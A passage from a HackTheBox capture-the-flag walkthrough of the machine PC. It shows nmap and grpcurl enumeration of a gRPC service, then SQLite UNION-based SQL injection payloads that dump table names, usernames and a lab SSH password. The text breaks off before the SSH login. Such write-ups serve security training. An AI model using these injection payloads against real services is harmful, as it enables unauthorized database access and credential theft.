
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PC - HTB</title>
    <link rel="stylesheet" href="/styles.css">
    <link rel="stylesheet" href="/writeups.css">
</head>
<body>
    <header>
        <nav>
            <ul>
                <li><a href="/index.html">Home</a></li>
                <li><a href="/writeups.html">Writeups</a></li>
                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
                <li><a href="/about.html">About me</a></li>
            </ul>
        </nav>
    </header>
    <section class="writeup-content">
        <div class="container">
            <div class="writeup-panel">
                <img src="/writeups/htb/easy/pc/img/pc.png" alt="Machine Icon" class="machine-icon-circle">
                <h2>PC - HTB</h2>
                <p>walkthrough by elswix<p>
                <ul class="machine-links">
                    <li><a href="https://app.hackthebox.com/machines/PC">HackTheBox</a></li>
                </ul>
            </div>
            <div class="writeup-content-main">
                <div class="codehilite"><pre><span></span><code><span class="n">Machine</span><span class="o">:</span><span class="w"> </span><span class="n">PC</span>
<span class="n">Difficult</span><span class="o">:</span><span class="w"> </span><span class="n">Easy</span>
<span class="n">Platform</span><span class="o">:</span><span class="w"> </span><span class="n">HackTheBox</span>
<span class="n">Release</span><span class="o">:</span><span class="w"> </span><span class="n">Released</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="mi">05</span><span class="sr">/20/</span><span class="mi">2023</span>
</code></pre><br style="line-height: 0.5;"/></div>
<h3><br/>About PC</h3><br/>
PC is an easy-level machine from HackTheBox. Firstly, we discover the gRPC service running on port <code>50051</code>. Using the <code>grpcgui</code> tool, we set up a service to access it through a web interface.<br/><br/>
<h3><br>Shell as sau</br></h3><br>
In the <code>getInfo</code> section, a field through the POST method is vulnerable to SQL injection, allowing us to extract information from the database and obtain SSH credentials for the <code>sau</code> user.<br/><br/>
<h3><br>Shell as root</br></h3><br>
When we list the open ports locally on the victim machine, we notice that port <code>8000</code> is open. Through Port Forwarding, we manage to access the web service exposed on port <code>8000</code>. This web service uses a vulnerable version of <code>pyLoad</code>, allowing us to execute commands as <code>root</code>.<br/><br/>
<h3><br>Recon</br></h3><br>
As always, it's crucial to determine the exposed services on the victim machine. To achieve this, we'll start by identifying the open ports on the victim machine using the <code>nmap</code> tool:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="o">--</span><span class="k">open</span><span class="w"> </span><span class="o">-</span><span class="n">sS</span><span class="w"> </span><span class="o">--</span><span class="nf">min</span><span class="o">-</span><span class="n">rate</span><span class="w"> </span><span class="mi">5000</span><span class="w"> </span><span class="o">-</span><span class="n">vvv</span><span class="w"> </span><span class="o">-</span><span class="n">n</span><span class="w"> </span><span class="o">-</span><span class="n">Pn</span><span class="w"> </span><span class="mf">10.10.11.214</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">portScan</span>

<span class="n">PORT</span><span class="w">      </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"> </span><span class="n">REASON</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span><span class="w">    </span><span class="k">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">     </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">63</span>
<span class="mi">50051</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="k">unknown</span><span class="w"> </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">63</span>
</code></pre><br style="line-height: 0.5;"/></div>

At first glance, we can observe that ports 22 and 50051 are open on the victim machine. The next step is to gather information about these ports, including the technologies running on them and the associated services.<br/><br/>
Now, we will conduct a comprehensive scan on these ports once again using the <code>nmap</code> tool:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="nx">elswix</span><span class="err">@</span><span class="nx">kali</span><span class="err">$</span><span class="w"> </span><span class="nx">nmap</span><span class="w"> </span><span class="o">-</span><span class="nx">sCV</span><span class="w"> </span><span class="o">-</span><span class="nx">p22</span><span class="p">,</span><span class="mi">50051</span><span class="w"> </span><span class="m m-Double">10.10.11.2</span><span class="mi">14</span><span class="w"> </span><span class="o">-</span><span class="nx">oN</span><span class="w"> </span><span class="nx">fullScan</span><span class="w"> </span><span class="o">-</span><span class="nx">Pn</span>
<span class="nx">PORT</span><span class="w">      </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w"> </span><span class="nx">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span><span class="w">    </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssh</span><span class="w">     </span><span class="nx">OpenSSH</span><span class="w"> </span><span class="m m-Double">8.2</span><span class="nx">p1</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="w"> </span><span class="mi">4</span><span class="nx">ubuntu0</span><span class="m m-Double">.7</span><span class="w"> </span><span class="p">(</span><span class="nx">Ubuntu</span><span class="w"> </span><span class="nx">Linux</span><span class="p">;</span><span class="w"> </span><span class="nx">protocol</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="p">)</span>
<span class="o">|</span><span class="w"> </span><span class="nx">ssh</span><span class="o">-</span><span class="nx">hostkey</span><span class="p">:</span><span class="w"> </span>
<span class="o">|</span><span class="w">   </span><span class="mi">3072</span><span class="w"> </span><span class="mi">91</span><span class="p">:</span><span class="nx">bf</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="nx">ed</span><span class="p">:</span><span class="nx">ea</span><span class="p">:</span><span class="mi">1</span><span class="nx">e</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">1</span><span class="nx">f</span><span class="p">:</span><span class="mi">53</span><span class="p">:</span><span class="mi">2</span><span class="nx">c</span><span class="p">:</span><span class="nx">ea</span><span class="p">:</span><span class="mi">71</span><span class="p">:</span><span class="nx">e5</span><span class="p">:</span><span class="nx">ef</span><span class="w"> </span><span class="p">(</span><span class="nx">RSA</span><span class="p">)</span>
<span class="o">|</span><span class="w">   </span><span class="mi">256</span><span class="w"> </span><span class="mi">84</span><span class="p">:</span><span class="mi">86</span><span class="p">:</span><span class="nx">a6</span><span class="p">:</span><span class="nx">e2</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="nx">ab</span><span class="p">:</span><span class="nx">df</span><span class="p">:</span><span class="nx">f7</span><span class="p">:</span><span class="mi">1</span><span class="nx">d</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">6</span><span class="nx">c</span><span class="p">:</span><span class="nx">cf</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">09</span><span class="p">:</span><span class="nx">de</span><span class="w"> </span><span class="p">(</span><span class="nx">ECDSA</span><span class="p">)</span>
<span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="mi">256</span><span class="w"> </span><span class="mi">1</span><span class="nx">a</span><span class="p">:</span><span class="nx">a8</span><span class="p">:</span><span class="mi">95</span><span class="p">:</span><span class="mi">72</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">5</span><span class="nx">e</span><span class="p">:</span><span class="mi">8</span><span class="nx">e</span><span class="p">:</span><span class="mi">3</span><span class="nx">c</span><span class="p">:</span><span class="nx">f1</span><span class="p">:</span><span class="mi">80</span><span class="p">:</span><span class="nx">f5</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="nx">fd</span><span class="p">:</span><span class="mi">0</span><span class="nx">a</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">1</span><span class="nx">c</span><span class="w"> </span><span class="p">(</span><span class="nx">ED25519</span><span class="p">)</span>
<span class="mi">50051</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">unknown</span>
<span class="mi">1</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">unrecognized</span><span class="w"> </span><span class="nx">despite</span><span class="w"> </span><span class="nx">returning</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="w"> </span><span class="nx">If</span><span class="w"> </span><span class="nx">you</span><span class="w"> </span><span class="nx">know</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">service</span><span class="o">/</span><span class="nx">version</span><span class="p">,</span><span class="w"> </span><span class="nx">please</span><span class="w"> </span><span class="nx">submit</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">following</span><span class="w"> </span><span class="nx">fingerprint</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org/cgi-bin/submit.cgi?new-service :</span>
<span class="nx">SF</span><span class="o">-</span><span class="nx">Port50051</span><span class="o">-</span><span class="nx">TCP</span><span class="p">:</span><span class="nx">V</span><span class="p">=</span><span class="m m-Double">7.9</span><span class="mi">4</span><span class="o">%</span><span class="nx">I</span><span class="p">=</span><span class="mi">7</span><span class="o">%</span><span class="nx">D</span><span class="p">=</span><span class="mi">10</span><span class="o">/</span><span class="mi">7</span><span class="o">%</span><span class="nx">Time</span><span class="p">=</span><span class="mi">65214</span><span class="nx">C50</span><span class="o">%</span><span class="nx">P</span><span class="p">=</span><span class="nx">x86_64</span><span class="o">-</span><span class="nx">pc</span><span class="o">-</span><span class="nx">linux</span><span class="o">-</span><span class="nx">gnu</span><span class="o">%</span><span class="nx">r</span><span class="p">(</span><span class="nx">N</span>
<span class="nx">SF</span><span class="p">:</span><span class="nx">ULL</span><span class="p">,</span><span class="mi">2</span><span class="nx">E</span><span class="p">,</span><span class="s">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x0</span>
<span class="s">SF:6\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0"</span><span class="p">)</span><span class="o">%</span><span class="nx">r</span><span class="p">(</span><span class="nx">Generic</span>
<span class="nx">SF</span><span class="p">:</span><span class="nx">Lines</span><span class="p">,</span><span class="mi">2</span><span class="nx">E</span><span class="p">,</span><span class="s">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\</span>
<span class="s">SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0"</span><span class="p">)</span><span class="o">%</span><span class="nx">r</span><span class="p">(</span><span class="nx">GetRe</span>
<span class="nx">SF</span><span class="p">:</span><span class="nx">quest</span><span class="p">,</span><span class="mi">2</span><span class="nx">E</span><span class="p">,</span><span class="s">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\</span>
<span class="s">SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0"</span><span class="p">)</span><span class="o">%</span><span class="nx">r</span><span class="p">(</span><span class="nx">HTTPO</span>
<span class="nx">SF</span><span class="p">:</span><span class="nx">ptions</span><span class="p">,</span><span class="mi">2</span><span class="nx">E</span><span class="p">,</span><span class="s">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0</span>
<span class="s">SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0"</span><span class="p">)</span><span class="o">%</span><span class="nx">r</span><span class="p">(</span><span class="nx">RTSP</span>
<span class="nx">SF</span><span class="p">:</span><span class="nx">Request</span><span class="p">,</span><span class="mi">2</span><span class="nx">E</span><span class="p">,</span><span class="s">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\</span>
<span class="s">SF:0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0"</span><span class="p">)</span><span class="o">%</span><span class="nx">r</span><span class="p">(</span><span class="nx">RPC</span>
<span class="nx">SF</span><span class="p">:</span><span class="nx">Check</span><span class="p">,</span><span class="mi">2</span><span class="nx">E</span><span class="p">,</span><span class="s">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\</span>
<span class="s">SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0"</span><span class="p">)</span><span class="o">%</span><span class="nx">r</span><span class="p">(</span><span class="nx">DNSVe</span>
<span class="nx">SF</span><span class="p">:</span><span class="nx">rsionBindReqTCP</span><span class="p">,</span><span class="mi">2</span><span class="nx">E</span><span class="p">,</span><span class="s">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\</span>
<span class="s">SF:xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0</span>
<span class="s">SF:"</span><span class="p">)</span><span class="o">%</span><span class="nx">r</span><span class="p">(</span><span class="nx">DNSStatusRequestTCP</span><span class="p">,</span><span class="mi">2</span><span class="nx">E</span><span class="p">,</span><span class="s">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0</span>
<span class="s">SF:\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\</span>
<span class="s">SF:0\0\?\0\0"</span><span class="p">)</span><span class="o">%</span><span class="nx">r</span><span class="p">(</span><span class="nx">Help</span><span class="p">,</span><span class="mi">2</span><span class="nx">E</span><span class="p">,</span><span class="s">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0</span>
<span class="s">SF:\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\</span>
<span class="s">SF:0\0"</span><span class="p">)</span><span class="o">%</span><span class="nx">r</span><span class="p">(</span><span class="nx">SSLSessionReq</span><span class="p">,</span><span class="mi">2</span><span class="nx">E</span><span class="p">,</span><span class="s">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x0</span>
<span class="s">SF:5\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0</span>
<span class="s">SF:\?\0\0"</span><span class="p">)</span><span class="o">%</span><span class="nx">r</span><span class="p">(</span><span class="nx">TerminalServerCookie</span><span class="p">,</span><span class="mi">2</span><span class="nx">E</span><span class="p">,</span><span class="s">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf</span>
<span class="s">SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0</span>
<span class="s">SF:\0\0\0\0\0\?\0\0"</span><span class="p">)</span><span class="o">%</span><span class="nx">r</span><span class="p">(</span><span class="nx">TLSSessionReq</span><span class="p">,</span><span class="mi">2</span><span class="nx">E</span><span class="p">,</span><span class="s">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?</span>
<span class="s">SF:\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x0</span>
<span class="s">SF:8\0\0\0\0\0\0\?\0\0"</span><span class="p">)</span><span class="o">%</span><span class="nx">r</span><span class="p">(</span><span class="nx">Kerberos</span><span class="p">,</span><span class="mi">2</span><span class="nx">E</span><span class="p">,</span><span class="s">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x</span>
<span class="s">SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\</span>
<span class="s">SF:0\0\0\0\0\0\?\0\0"</span><span class="p">)</span><span class="o">%</span><span class="nx">r</span><span class="p">(</span><span class="nx">SMBProgNeg</span><span class="p">,</span><span class="mi">2</span><span class="nx">E</span><span class="p">,</span><span class="s">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x</span>
<span class="s">SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\</span>
<span class="s">SF:0\0\0\0\0\0\?\0\0"</span><span class="p">)</span><span class="o">%</span><span class="nx">r</span><span class="p">(</span><span class="nx">X11Probe</span><span class="p">,</span><span class="mi">2</span><span class="nx">E</span><span class="p">,</span><span class="s">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff</span>
<span class="s">SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\</span>
<span class="s">SF:0\0\0\0\0\?\0\0"</span><span class="p">);</span>
<span class="nx">Service</span><span class="w"> </span><span class="nx">Info</span><span class="p">:</span><span class="w"> </span><span class="nx">OS</span><span class="p">:</span><span class="w"> </span><span class="nx">Linux</span><span class="p">;</span><span class="w"> </span><span class="nx">CPE</span><span class="p">:</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">linux</span><span class="p">:</span><span class="nx">linux_kernel</span>

<span class="nx">Service</span><span class="w"> </span><span class="nx">detection</span><span class="w"> </span><span class="nx">performed</span><span class="p">.</span><span class="w"> </span><span class="nx">Please</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">incorrect</span><span class="w"> </span><span class="nx">results</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org/submit/ .</span>
<span class="nx">Nmap</span><span class="w"> </span><span class="nx">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="nx">up</span><span class="p">)</span><span class="w"> </span><span class="nx">scanned</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m m-Double">37.5</span><span class="mi">9</span><span class="w"> </span><span class="nx">seconds</span>
</code></pre><br style="line-height: 0.5;"/></div>

There is no relevant information, but we can see that <code>nmap</code> failed to detect the service running on port 50051.<br/><br/>
After conducting some research on the internet, I discovered that port 50051 is associated with the gRPC service. I found various methods for exploiting this service in this <a href="https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9">article</a>.<br/><br/>
We can attempt to list the services running under gRPC on the victim machine. To do this, as demonstrated in the article, we can utilize the tool <a href="https://github.com/fullstorydev/grpcurl">grpcurl</a>.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="nx">elswix</span><span class="err">@</span><span class="nx">kali</span><span class="err">$</span><span class="w"> </span><span class="nx">grpcurl</span><span class="w"> </span><span class="o">-</span><span class="nx">plaintext</span><span class="w"> </span><span class="m m-Double">10.10.11.2</span><span class="mi">14</span><span class="p">:</span><span class="mi">50051</span><span class="w"> </span><span class="nx">list</span>
<span class="nx">SimpleApp</span>
<span class="nx">grpc</span><span class="p">.</span><span class="nx">reflection</span><span class="p">.</span><span class="nx">v1alpha</span><span class="p">.</span><span class="nx">ServerReflection</span>
</code></pre><br style="line-height: 0.5;"/></div>

We managed to see that there is a running service called <code>SimpleApp</code>. Let's take a closer look.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="nx">elswix</span><span class="err">@</span><span class="nx">kali</span><span class="err">$</span><span class="w"> </span><span class="nx">grpcurl</span><span class="w"> </span><span class="o">-</span><span class="nx">plaintext</span><span class="w"> </span><span class="m m-Double">10.10.11.2</span><span class="mi">14</span><span class="p">:</span><span class="mi">50051</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">SimpleApp</span>
<span class="nx">SimpleApp</span><span class="p">.</span><span class="nx">LoginUser</span>
<span class="nx">SimpleApp</span><span class="p">.</span><span class="nx">RegisterUser</span>
<span class="nx">SimpleApp</span><span class="p">.</span><span class="nx">getInfo</span>
</code></pre><br style="line-height: 0.5;"/></div>

To interact with these services, we can use the tool <a href="https://github.com/fullstorydev/grpcui">grpcui</a>. This will allow us to expose the service at the web level for interaction.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">grpcui</span><span class="w"> </span><span class="o">-</span><span class="n">plaintext</span><span class="w"> </span><span class="mf">10.10.11.214</span><span class="err">:</span><span class="mi">50051</span>
<span class="n">gRPC</span><span class="w"> </span><span class="n">Web</span><span class="w"> </span><span class="n">UI</span><span class="w"> </span><span class="n">available</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="err">:</span><span class="mi">39255</span><span class="o">/</span>
</code></pre><br style="line-height: 0.5;"/></div>

If we attempt to access that URL through the browser, we should be able to access the service successfully.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pc/img/1.png"/><br/><br/>
If we look at the <code>Method name</code> section, we can see three entries: one called <code>LoginUser</code>, another called <code>RegisterUser</code>, and a third called <code>getInfo</code>.<br/><br/>
From this, we can deduce that there is a database backend with which we are interacting for actions like logging in and registering.<br/><br/>
First, in the <code>LoginUser</code> section, I will attempt to log in using typical credentials:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pc/img/2.png"/><br/><br/>
It appears that these credentials work, and we receive the following response:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pc/img/3.png"/><br/><br/>
It returns a supposed <code>id</code> with the value <code>430</code> and a token that may allow us to perform some form of authentication or similar action.<br/><br/>
If we navigate to the <code>getInfo</code> section, we can see that it requests a field called <code>id</code>, which may be related to what we obtained when authenticating with the credentials we provided. <br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pc/img/4.png"/><br/><br/>
I will enter the value that was reported to me earlier:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pc/img/5.png"/><br/><br/>
If we click on <code>Invoke</code>, we will see the following in the response:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pc/img/6.png"/><br/><br/>
It returns an error, stating that the <code>token</code> header is missing, which is likely related to the token we received during authentication.<br/><br/>
Since I didn't copy the token earlier, I had to authenticate again to obtain a new one. Additionally, a new value for the <code>id</code> field was reported to me.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pc/img/7.png"/><br/><br/>
I tried entering the token value into the <code>name</code> and <code>value</code> fields to resend the request:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pc/img/8.png"/><br/><br/>
In the article I found about gRPC, there is an example of SQL Injection exploitation on the services.<br/><br/>
<h3><br>SQL Injection</br></h3><br>
We will focus on attempting to exploit an SQL Injection through the <code>id</code> field in the <code>getInfo</code> section. To do this, we will perform some small tests:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pc/img/9.png"/><br/><br/>
When attempting to test the typical SQL injection on the <code>id</code> field, we receive an error in the server's response. Making some changes to our query, we manage to successfully trigger the SQL injection:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pc/img/10.png"/><br/><br/>
Simply by removing the character <code>'</code>, we manage to make our SQL query evaluate and trigger the SQL injection. On the server side, the response is different from the previous one because this time the SQL query was valid and executed without errors.<br/><br/>
To successfully exploit the SQL injection, we need to determine which DBMS (Database Management System) we are dealing with. The DBMS is the type of database management system we are using, and aside from <code>SQLite</code>, others include <code>MySQL</code>, <code>PostgreSQL</code>, <code>MSSQL</code>, among others.<br/><br/>
After sending several queries on the <code>id</code> field, I was able to identify that we are dealing with <code>SQLite</code> in our case.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pc/img/11.png"/><br/><br/>
I identified that it's <code>SQLite</code> because the sent query executed successfully and returned the version of <code>SQLite</code> in use.<br/><br/>
To further investigate the database and extract information from it, I used payloads available on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md">PayloadsAllTheThings</a>.<br/><br/>
I will begin by enumerating the available tables in the database, for which I used the following payload:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="nx">UNION</span><span class="w"> </span><span class="nx">ALL</span><span class="w"> </span><span class="nx">SELECT</span><span class="w"> </span><span class="nx">group_concat</span><span class="p">(</span><span class="nx">tbl_name</span><span class="p">)</span><span class="w"> </span><span class="nx">FROM</span><span class="w"> </span><span class="nx">sqlite_master</span><span class="w"> </span><span class="nx">WHERE</span><span class="w"> </span><span class="k">type</span><span class="p">=</span><span class="err">'</span><span class="nx">table</span><span class="err">'</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="nx">tbl_name</span><span class="w"> </span><span class="nx">NOT</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="err">'</span><span class="nx">sqlite_</span><span class="o">%</span><span class="err">'</span>
</code></pre><br style="line-height: 0.5;"/></div>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pc/img/12.png"/><br/><br/>
We can see that there are two tables in the database, one named <code>accounts</code> and the other <code>messages</code>. The <code>accounts</code> table is the most noteworthy here because if there are more users besides <code>admin</code>, we can attempt to list the credentials.<br/><br/>
Using the following payload, we will list the columns belonging to the <code>accounts</code> table:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="mf">777</span><span class="w"> </span><span class="n">UNION</span><span class="w"> </span><span class="n">ALL</span><span class="w"> </span><span class="n">SELECT</span><span class="w"> </span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="n">AS</span><span class="w"> </span><span class="n">column_names</span><span class="w"> </span><span class="n">FROM</span><span class="w"> </span><span class="n">pragma_table_info</span><span class="p">(</span><span class="err">'</span><span class="n">accounts</span><span class="err">'</span><span class="p">)</span>
</code></pre><br style="line-height: 0.5;"/></div>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pc/img/13.png"/><br/><br/>
We can see that there are columns named <code>username</code> and <code>password</code> within the <code>accounts</code> table.<br/><br/>
Finally, we will attempt to extract the information stored in these columns. To do this, I will use <code>limit</code> to restrict the content listed in the server's response, making it easier to retrieve.<br/><br/>
Using the following payload, we can see the first username in this column:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="mf">777</span><span class="w"> </span><span class="n">UNION</span><span class="w"> </span><span class="n">ALL</span><span class="w"> </span><span class="n">SELECT</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="n">FROM</span><span class="w"> </span><span class="n">accounts</span><span class="w"> </span><span class="n">limit</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="mf">1</span>
</code></pre><br style="line-height: 0.5;"/></div>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pc/img/14.png"/><br/><br/>
If we list the password associated with the <code>admin</code> user, we can observe that they are using their username as their password:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="mf">777</span><span class="w"> </span><span class="n">UNION</span><span class="w"> </span><span class="n">ALL</span><span class="w"> </span><span class="n">SELECT</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">FROM</span><span class="w"> </span><span class="n">accounts</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="err">'</span><span class="n">admin</span><span class="err">'</span><span class="w"> </span><span class="n">limit</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="mf">1</span>
</code></pre><br style="line-height: 0.5;"/></div>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pc/img/15.png"/><br/><br/>
If we attempt to list if there are more usernames in the <code>username</code> column, we come across the username <code>sau</code>:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="mf">777</span><span class="w"> </span><span class="n">UNION</span><span class="w"> </span><span class="n">ALL</span><span class="w"> </span><span class="n">SELECT</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="n">FROM</span><span class="w"> </span><span class="n">accounts</span><span class="w"> </span><span class="n">limit</span><span class="w"> </span><span class="mf">1</span><span class="p">,</span><span class="mf">1</span>
</code></pre><br style="line-height: 0.5;"/></div>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pc/img/16.png"/><br/><br/>
If we list the password corresponding to this user, we receive the following report:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="mf">777</span><span class="w"> </span><span class="n">UNION</span><span class="w"> </span><span class="n">ALL</span><span class="w"> </span><span class="n">SELECT</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">FROM</span><span class="w"> </span><span class="n">accounts</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="err">'</span><span class="n">sau</span><span class="err">'</span><span class="w"> </span><span class="n">limit</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="mf">1</span>
</code></pre><br style="line-height: 0.5;"/></div>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pc/img/17.png"/><br/><br/>
The password <code>HereIsYourPassWord1431</code> belongs to the user <code>sau</code> We can try using it to connect via SSH. Although we don't know the system-level users, we can check if the user <code>sau</code> exists on the system:<br/><br/>
